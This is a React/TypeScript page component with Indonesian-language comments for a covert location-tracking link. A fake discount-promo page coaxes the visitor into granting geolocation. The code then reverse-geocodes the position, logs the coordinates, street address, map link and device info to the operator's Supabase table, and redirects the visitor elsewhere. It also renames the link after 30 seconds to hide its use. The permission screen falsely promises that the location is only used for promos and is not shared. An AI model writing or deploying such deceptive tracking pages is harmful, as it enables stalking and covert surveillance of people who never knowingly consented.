import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import { getLocation, Location } from '../lib/geo'
import { supabase } from '../lib/supabase'

export default function Track() {
  const { name } = useParams()
  const [locationState, setLocationState] = useState<'initial' | 'requesting' | 'denied' | 'tracking'>('initial')
  const [trackingData, setTrackingData] = useState<{
    name: string, 
    description: string | null, 
    redirect_url: string
  }>()

  useEffect(() => {
    // Ambil data tracking link termasuk deskripsi dan URL redirect
    const fetchTrackingLink = async () => {
      try {
        const { data, error } = await supabase
          .from('tracking_links')
          .select('name, description, redirect_url')
          .eq('name', name)
          .single()
          
        if (error) throw error
        if (data) {
          setTrackingData(data)
        }
      } catch (err) {
        console.error('Error fetching tracking link:', err)
      }
    }
    
    fetchTrackingLink()
    
    // Memulai permintaan lokasi
    const requestLocation = async () => {
      setLocationState('requesting')
      
      try {
        // Coba mendapatkan lokasi
        const location = await getLocation()
        setLocationState('tracking')
        
        // Jika berhasil mendapatkan lokasi, lanjutkan dengan tracking
        trackLocationData(location)
      } catch (error) {
        console.error('Error getting location:', error)
        // Jika pengguna menolak akses lokasi
        setLocationState('denied')
      }
    }
    
    // Fungsi untuk mengirim data tracking jika berhasil mendapat lokasi
    const trackLocationData = async (location: Location) => {
      try {
        // Ambil data link tracking
        const { data: linkData, error: linkError } = await supabase
          .from('tracking_links')
          .select('tracking_code, redirect_url')
          .eq('name', name)
          .single()

        if (linkError) throw linkError
        if (!linkData) throw new Error('Link tidak ditemukan')

        // Simpan kode tracking dan URL redirect
        const trackingCode = linkData.tracking_code
        const redirectTo = linkData.redirect_url || 'https://google.com'

        // Dapatkan alamat dari reverse geocoding
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}`
        )
        const addressData = await response.json()
        const address = addressData.display_name

        // Buat URL Google Maps
        const googleMapsUrl = `https://www.google.com/maps?q=${location.lat},${location.lng}`

        // Simpan data tracking
        const { error: trackingError } = await supabase
          .from('tracking_logs')
          .insert([{
            tracking_code: trackingCode,
            lat: location.lat,
            lng: location.lng,
            address,
            google_maps_url: googleMapsUrl,
            device_info: navigator.userAgent
          }])

        if (trackingError) throw trackingError

        // Tunggu 30 detik, lalu hapus nama link agar tidak bisa digunakan lagi
        setTimeout(async () => {
          try {
            // Mengupdate nama link dengan kode acak agar tidak bisa digunakan lagi
            // Kita tetap menyimpan tracking_code untuk melihat hasilnya di dashboard
            const randomSuffix = Math.random().toString(36).substring(2, 10)
            const { error: deleteError } = await supabase
              .from('tracking_links')
              .update({ 
                name: `expired_${randomSuffix}`,
                is_clicked: true,
                clicked_at: new Date().toISOString()
              })
              .eq('name', name)

            if (deleteError) {
              console.error('Error deleting link name:', deleteError)
            } else {
              console.log('Link name deleted after 30 seconds')
            }
          } catch (err) {
            console.error('Error in delayed link deletion:', err)
          }
        }, 30000) // 30 detik

        // Redirect ke URL yang ditentukan setelah berhasil
        setTimeout(() => {
          window.location.href = redirectTo
        }, 1000)
      } catch (error) {
        console.error('Error tracking location:', error)
        // Redirect ke Google meskipun error
        window.location.href = 'https://google.com'
      }
    }
    
    requestLocation()
  }, [name])

  // Tampilan jika pengguna menolak akses lokasi
  if (locationState === 'denied') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-100 to-pink-100 flex items-center justify-center">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md mx-auto text-center">
          <div className="mb-6">
            <svg className="w-16 h-16 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          
          <h1 className="text-2xl font-bold text-gray-800 mb-4">Akses Lokasi Diperlukan</h1>
          
          <p className="text-gray-600 mb-6">
            Untuk melihat promo khusus di area Anda, kami memerlukan izin akses lokasi. Promo akan disesuaikan dengan kota Anda untuk penawaran yang lebih relevan.
          </p>
          
          <div className="space-y-4">
            <button 
              onClick={() => window.location.reload()} 
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-3 px-6 rounded-lg font-medium hover:from-purple-700 hover:to-pink-700 transition-all duration-300"
            >
              Izinkan Akses Lokasi
            </button>
            
            <p className="text-sm text-gray-500">
              Kami hanya menggunakan lokasi Anda untuk menampilkan promo dan diskon terdekat. Data Anda aman dan tidak dibagikan.
            </p>
          </div>
        </div>
      </div>
    )
  }

  // Tampilan default untuk proses loading
  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-100 to-pink-100 flex items-center justify-center">
      <div className="text-center max-w-md px-4">
        <div className="animate-bounce mb-6">
          <svg className="w-16 h-16 mx-auto text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v13m0-13V6a4 4 0 118 0v7M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
          </svg>
        </div>
        
        <h1 className="text-3xl font-bold text-gray-800 mb-4">Mencari Promo di Kota Anda</h1>
        
        {trackingData?.description ? (
          <p className="text-gray-600 mb-4">{trackingData.description}</p>
        ) : (
          <p className="text-gray-600 mb-4">Kami sedang menyesuaikan penawaran terbaik untuk lokasi Anda. Mohon tunggu sebentar...</p>
        )}
        
        <div className="flex justify-center">
          <span className="bg-white px-4 py-2 rounded-full text-sm font-medium text-purple-600 shadow-md">
            Diskon Hingga 70%
          </span>
        </div>
      </div>
    </div>
  )
} 